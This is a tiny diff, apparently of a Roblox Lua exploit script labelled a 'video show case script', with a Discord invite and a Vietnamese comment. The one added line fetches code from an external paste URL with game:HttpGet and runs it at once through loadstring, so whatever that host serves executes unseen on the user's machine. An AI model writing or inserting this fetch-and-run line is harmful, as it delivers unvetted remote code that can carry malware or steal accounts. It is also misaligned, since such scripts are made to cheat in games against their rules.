@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://shz.al/~sidi"))()
 ---[[discord:https://discord.gg/w26VGWmMPb]]---
 ---kiệt lặc---
 video show case script!!!
